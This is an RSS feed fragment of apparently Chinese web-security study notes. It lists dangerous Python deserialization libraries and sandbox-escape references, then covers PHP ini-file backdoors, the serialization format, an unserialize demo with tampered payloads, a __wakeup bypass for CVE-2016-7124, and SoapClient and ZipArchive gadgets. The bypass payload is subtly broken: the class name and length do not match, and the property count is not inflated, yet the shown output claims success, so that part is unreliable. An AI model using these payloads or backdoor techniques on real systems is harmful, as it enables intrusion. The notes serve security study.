&lt;h2 id=&#34;危险第三方库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危险第三方库&#34;&gt;#&lt;/a&gt; 危险第三方库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Template&lt;/li&gt;
&lt;li&gt;subprocess32&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-2&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;marshal&lt;/li&gt;
&lt;li&gt;PyYAML&lt;/li&gt;
&lt;li&gt;pickle&lt;/li&gt;
&lt;li&gt;cPickle&lt;/li&gt;
&lt;li&gt;shelve&lt;/li&gt;
&lt;li&gt;PIL&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;反序列化-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-3&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy85NTc2Lmh0bWw=&#34;&gt;Python pickle 反序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aWtpLnB5dGhvbi5vcmcvbW9pbi9TYW5kYm94ZWRQeXRob24=&#34;&gt;Python 沙箱 官方 wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;[Python eval 的常见错误封装及利用原理](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4bGVnZW5kLmNvbS8yMDE1LzA3LzMxL1B5dGhvbg==&#34;&gt;http://xxlegend.com/2015/07/31/Python&lt;/span&gt; eval 的常见错误封装及利用原理 /)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3BpY2tsZS5odG1s&#34;&gt;pickle Python 对象序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTEvU2xhdmllcm8vQkhfVVNfMTFfU2xhdmllcm9fU291cl9QaWNrbGVzX1NsaWRlcy5wZGY=&#34;&gt;Sour Pickles A serialised exploitation guide in one part&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ydXNodGVyLmNvbS9ibG9nL3BpY2tsZS1zZXJpYWxpemF0aW9uLWludGVybmFscy8=&#34;&gt;How pickle works in Python&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;沙箱-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱-2&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODYzNjY=&#34;&gt;Python 沙箱通用绕过&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMzIwOC5odG1s&#34;&gt;一文看懂 Python 沙箱逃逸&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;格式化字符串-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化字符串-2&#34;&gt;#&lt;/a&gt; 格式化字符串&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcHl0aG9uLXN0cmluZy1mb3JtYXQtdnVsbmVyYWJpbGl0eS5odG1s&#34;&gt;Python 字符串格式化漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2x1Y3Vtci5wb2Nvby5vcmcvMjAxNi8xMi8yOS9jYXJlZnVsLXdpdGgtc3RyLWZvcm1hdC8=&#34;&gt;Be Careful with Python&#39;s New-Style String Format&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;综合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#综合&#34;&gt;#&lt;/a&gt; 综合&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZzdGlubmVyL3B5dGhvbi1zZWN1cml0eS5naXQ=&#34;&gt;python security&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vcHl0aG9uX3NlYw==&#34;&gt;Python 安全和代码审计相关资料收集&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/</guid>
            <title>PHP</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>PHP</category>
            <pubDate>Sun, 27 Nov 2022 15:53:16 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h1&gt;
&lt;h2 id=&#34;phpini构成的后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpini构成的后门&#34;&gt;#&lt;/a&gt; php.ini 构成的后门&lt;/h2&gt;
&lt;p&gt;利用 auto_prepend_file 和 include_path&lt;/p&gt;
&lt;h2 id=&#34;userini文件构成的php后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#userini文件构成的php后门&#34;&gt;#&lt;/a&gt; .user.ini 文件构成的 PHP 后门&lt;/h2&gt;
&lt;p&gt;.user.ini 可运行于所有以 fastcgi 运行的 server。 利用方式同 php.ini&lt;/p&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;php序列化实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php序列化实现&#34;&gt;#&lt;/a&gt; PHP 序列化实现&lt;/h2&gt;
&lt;h3 id=&#34;常见处理器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见处理器&#34;&gt;#&lt;/a&gt; 常见处理器&lt;/h3&gt;
&lt;p&gt;PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX (需要编译时开启支持)，默认为 php，可通过配置中的  &lt;code&gt;session.serialize_handler&lt;/code&gt;  修改。&lt;/p&gt;
&lt;p&gt;如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。&lt;/p&gt;
&lt;p&gt;其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize () 函数序列化处理的值。&lt;/p&gt;
&lt;p&gt;其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值。&lt;/p&gt;
&lt;p&gt;其中 php_serialize 处理器的格式为：经过 serialize () 函数序列化处理的数组。&lt;/p&gt;
&lt;h3 id=&#34;序列化格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列化格式&#34;&gt;#&lt;/a&gt; 序列化格式&lt;/h3&gt;
&lt;p&gt;其中 php_serialize 的实现在  &lt;code&gt;php-src/ext/standard/var.c&lt;/code&gt;  中，主要函数为  &lt;code&gt;php_var_serialize_intern&lt;/code&gt;  ，序列化后的格式如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;boolean
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;b:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b:1;&lt;/code&gt;  // true&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b:0;&lt;/code&gt;  // false&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;integer
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;i:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;double
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;d:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NULL
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;N;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s:&amp;lt;length&amp;gt;:&amp;quot;&amp;lt;value&amp;gt;&amp;quot;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:1:&amp;quot;s&amp;quot;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;array
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a:&amp;lt;length&amp;gt;:&amp;#123;key, value&amp;#125;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a:1:&amp;#123;s:4:&amp;quot;key1&amp;quot;;s:6:&amp;quot;value1&amp;quot;;&amp;#125;&lt;/code&gt;  //  &lt;code&gt;array(&amp;quot;key1&amp;quot; =&amp;gt; &amp;quot;value1&amp;quot;);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;object
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;O:&amp;lt;class_name_length&amp;gt;:&amp;quot;&amp;lt;class_name&amp;gt;&amp;quot;:&amp;lt;number_of_properties&amp;gt;:&amp;#123;&amp;lt;properties&amp;gt;&amp;#125;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;reference
&lt;ul&gt;
&lt;li&gt;指针类型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;R:reference;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``O:1:&amp;quot;A&amp;quot;:2:{s:1:&amp;quot;a&amp;quot;;i:1;s:1:&amp;quot;b&amp;quot;;R:2;}`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$a = new A();$a-&amp;gt;a=1;$a-&amp;gt;b=&amp;amp;$a-&amp;gt;a;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;private与protect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#private与protect&#34;&gt;#&lt;/a&gt; private 与 protect&lt;/h3&gt;
&lt;p&gt;private 与 protect 变量和 public 变量不同，不能直接设置。&lt;/p&gt;
&lt;p&gt;private 属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即  &lt;code&gt;%00className%00&lt;/code&gt;  用于标定其是私有的。&lt;/p&gt;
&lt;p&gt;protected 属性可以在父类和子类中访问，变量前添加  &lt;code&gt;%00*%00&lt;/code&gt;  用于标定其是受保护的。&lt;/p&gt;
&lt;h2 id=&#34;php反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反序列化漏洞&#34;&gt;#&lt;/a&gt; PHP 反序列化漏洞&lt;/h2&gt;
&lt;p&gt;php 在反序列化的时候会调用  &lt;code&gt;__wakeup&lt;/code&gt;  /  &lt;code&gt;__sleep&lt;/code&gt;  等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;__toString&lt;/code&gt;  /  &lt;code&gt;__call&lt;/code&gt;  两个函数也有利用的可能。&lt;/p&gt;
&lt;p&gt;其中  &lt;code&gt;__wakeup&lt;/code&gt;  在反序列化时被触发， &lt;code&gt;__destruct&lt;/code&gt;  在 GC 时被触发，  &lt;code&gt;__toString&lt;/code&gt;  在 echo 时被触发， &lt;code&gt;__call&lt;/code&gt;  在一个未被定义的函数调用时被触发。&lt;/p&gt;
&lt;p&gt;下面提供一个简单的 demo.&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Demo&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;construct&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;wake up&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Data&#39;s value is &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt;&lt;/span&gt;. &amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;destruct&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Demo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;raw value&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;construct
Data&#39;s value is raw value.
destruct
string(44) &amp;quot;O:4:&amp;quot;Demo&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:9:&amp;quot;raw value&amp;quot;;&amp;#125;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把序列化的字符串修改一下后，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unserialize(&#39;O:4:&amp;quot;Demo&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:15:&amp;quot;malicious value&amp;quot;;&amp;#125;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wake up
Data&#39;s value is malicious value.
destruct
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里看到，值被修改了.&lt;/p&gt;
&lt;p&gt;上面是一个  &lt;code&gt;unserialize()&lt;/code&gt;  的简单应用，不难看出，如果  &lt;code&gt;__wakeup()&lt;/code&gt;  或者  &lt;code&gt;__desturct()&lt;/code&gt;  有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。&lt;/p&gt;
&lt;p&gt;那么，在  &lt;code&gt;__wakeup()&lt;/code&gt;  中加入判断是否可以阻止这个漏洞呢？ 在  &lt;code&gt;__wakeup()&lt;/code&gt;  中我们加入一行代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;raw value&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;raw value&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;wake up&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但其实还是可以绕过的，在 PHP5 &amp;lt; 5.6.25， PHP7 &amp;lt; 7.0.10 的版本都存在 wakeup 的漏洞。当反序列化中 object 的个数和之前的个数不等时，wakeup 就会被绕过，于是使用下面的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unserialize(&#39;O:7:&amp;quot;HITCON&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:15:&amp;quot;malicious value&amp;quot;;&amp;#125;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Data&#39;s value is malicious value.
destruct
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 wakeup 被绕过，值依旧被修改了。&lt;/p&gt;
&lt;h2 id=&#34;利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用点&#34;&gt;#&lt;/a&gt; 利用点&lt;/h2&gt;
&lt;h3 id=&#34;soapclient-原生利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#soapclient-原生利用&#34;&gt;#&lt;/a&gt; SoapClient 原生利用&lt;/h3&gt;
&lt;p&gt;php 中的 SoapClient 类可以创建 soap 数据报文，在非 wsdl 模式下，SoapClient 的实例反序列化的时候会对第二个参数指明的 url 进行 soap 请求，该特性可用于 SSRF。&lt;/p&gt;
&lt;h3 id=&#34;ziparchive-原生利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ziparchive-原生利用&#34;&gt;#&lt;/a&gt; ZipArchive 原生利用&lt;/h3&gt;
&lt;p&gt;php 原生类  &lt;code&gt;ZipArchive::open()&lt;/code&gt;  中的 flag 参数如果设置为  &lt;code&gt;ZipArchive::OVERWRITE&lt;/code&gt;  时，会删除指定文件，该特性在一定条件下可以用于删除文件。&lt;/p&gt;
&lt;h3 id=&#34;session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session&#34;&gt;#&lt;/a&gt; Session&lt;/h3&gt;
&lt;p&gt;PHP 中 session 默认是以文件形式存储的，文件以 sess_sessionid 命名，在 session 一定程度可控的情况下，可通过 session 触发反序列化。&lt;/p&gt;
&lt;h2 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;h3 id=&#34;cve-2016-7124&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-7124&#34;&gt;#&lt;/a&gt; CVE-2016-7124&lt;/h3&gt;
&lt;p&gt;在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性 (变量) 数大于实际的个数时，  &lt;code&gt;__wakeup()&lt;/code&gt;  不会被执行。&lt;/p&gt;
